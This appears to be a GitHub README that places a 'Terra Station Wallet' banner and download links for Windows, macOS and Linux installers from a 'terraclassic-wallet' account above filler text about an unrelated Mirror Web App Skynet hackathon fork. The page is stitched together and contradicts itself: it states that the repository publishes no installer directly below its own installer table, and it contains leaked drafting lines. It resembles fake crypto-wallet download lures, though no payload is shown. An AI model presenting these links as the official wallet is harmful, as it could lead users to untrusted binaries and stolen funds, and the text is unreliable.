![Terra Station Wallet](assets/banner-repo.png)

<h1 align="center">Mirror Web App as a Skapp</h1>

<p align="center">The Mirror front-end for Terra, packaged for Skynet, with the local development setup the README records.</p>

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-5392F7?style=for-the-badge&labelColor=101A42" alt="license Apache--2.0"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

The installer is linked from the release page rather than copied into this repository, and an empty cell marked PENDING has no value behind it to invent.

## What this repository is for

The README opens with a hackathon: the GitCoin Open DeFi challenge to host a DeFi front-end on Skynet, with a prize pool attached, and a numbered list of what the entry did. It gives a deployed address on a siasky host, a save-to-homescreen link, an ENS and an HNS domain variant, a GitHub Action that builds and deploys on push, and a step for hosting mutable application data on Skynet that the list marks as in progress.

Below that sits the part of the README that describes the software, and the note is unambiguous: the repository contains the source code for the Terra Mirror Web App that is deployed at the Mirror finance domain, and the Ethereum version lives in a different repository. The app is a web front-end for interacting with Mirror Contracts, and the README says it is intended to be used with the Terra Station Extension plugin for Chromium browsers.

So the repository is the Mirror interface, not the wallet and not the contracts. The interface reads and writes through contracts deployed elsewhere, and it expects a browser wallet to hold the keys.

## Who it is for

- A developer working on the Mirror interface for Terra, who needs the source and the local setup.
- Someone reviewing the Skynet entry, who wants to see what was built rather than read a summary of it.
- A user of Mirror who wants to understand that the interface is a web app talking to contracts, not a wallet.
- A reader looking for the Terra Station Wallet download, who is one repository off.

That last case is worth resolving immediately: the desktop wallet is released from its own repository in this account, and this one publishes no installer and never has.

## Start here

- [Terra Station Wallet](https://github.com/terraclassic-wallet/terra-station-wallet) - Desktop wallet, release history and licence, all in one repository.
- [Terra Station Wallet releases](https://github.com/terraclassic-wallet/terra-station-wallet/releases) - The files attached to the tag in force, with their checksums.
- [What Terra Station Wallet Is and Who Maintains It](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-what-is-it.md) - Where the product boundary actually sits.
- [The account profile](https://github.com/terraclassic-wallet) - All of the repositories here, grouped.
- [How to choose a LUNC wallet](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/how-to-choose-a-lunc-wallet.md) - What separates one custody model from the next.
- [Terra Station fees and gas](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-fees-and-gas.md) - What a transaction costs before the interface asks you to confirm.
- [Terra Station Wallet FAQ](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-faq-answered.md) - Short answers, arranged by the task you came to do.

## How to use this repository

1. Add the local hostname first. The README's development section asks for an entry pointing `local.mirror.finance` at the loopback address in the operating system's hosts file.
2. Install the dependencies, then run `yarn start`, which is the command the README gives.
3. Open the address the README prints, on port 3000 over the local hostname, once the development server is up.
4. Keep the browser piece in mind while you work: the README says the app is meant to run with the Terra Station Extension, so a session without it will not reach the parts that need a signer.
5. Treat the deployed Skynet addresses in the README as a record from the hackathon. They are third-party hosts, and this page does not promise they still serve the app.

## The guides, grouped

The README is short and split four ways, and the account's hubs cover the reader-facing material it leaves to other sites:

| Part | Covers | Read it when |
| --- | --- | --- |
| Hackathon list | What the entry deployed, and what it marked in progress | You are reviewing the Skynet submission |
| Note and description | Mirror Web App, Mirror Contracts, the Terra Station Extension | You need to know what the software is |
| User Guide | A pointer to the Mirror documentation for operating the app | You want to use the interface, not build it |
| Development | Hosts entry, `yarn start`, port 3000 | You are running it locally |

## What each route changes

| You want | Route | Result |
| --- | --- | --- |
| The interface running locally | Hosts entry, `yarn start` | A development build on the local hostname |
| The hackathon deployment | The siasky addresses in the README | A third-party host that may or may not still be serving |
| The wallet that signs for the app | This account's application repository | An installer and its checksum |
| The contracts the app calls | The repository the README names for them | Contract source outside this account |

## Common first questions

### Is this the Terra Station Wallet?

No. It is the Mirror web interface. The wallet is a separate desktop application published by this account, and the README only mentions the extension as the browser piece the app expects.

### Do I need a browser extension to use it?

The README says the app is intended for use with the Terra Station Extension for Chromium browsers. That is the wallet side of the interaction; the app itself holds no keys.

### Is the Skynet deployment still live?

The README records the addresses from the hackathon, including one deployment and one domain variant. They point at a third-party host, so check before relying on them. This page will not claim a host is up when it cannot see it.

### Why is the repository called mantlemint?

The name does not match the README's title, and this page will not invent an explanation for it. What the README describes is the Mirror Web App hosted as a Skapp, and that is what the repository holds.

### Which licence applies?

Apache-2.0, per the README's own licence section, which also carries a copyright line for Mirror Protocol dated 2020. The badge above repeats the identifier; the file is the authority.

## Before you build

Expect Create React App, since the README says the project was bootstrapped with it, and expect yarn rather than npm for the start command. The hosts entry is not optional: the app is served on a local hostname, and skipping the entry leaves you with a server you cannot open the documented way. Keep any keys out of the browser profile you test with, and use the extension for signing rather than pasting a phrase anywhere.

## About this repository

This repository predates the documentation around it and sits among the account's supporting repositories. Its README is a hackathon record plus a development note, and neither is a product page. The account keeps its own reading in three hubs, and this page exists to place the repository in that account without pretending the Mirror interface is something this account builds or supports.

## Licence and reuse

Apache-2.0, as the README's licence section states and the badge above names. Reuse follows those terms, including the notice requirements the licence sets out, and the copyright line in the README stays with the code.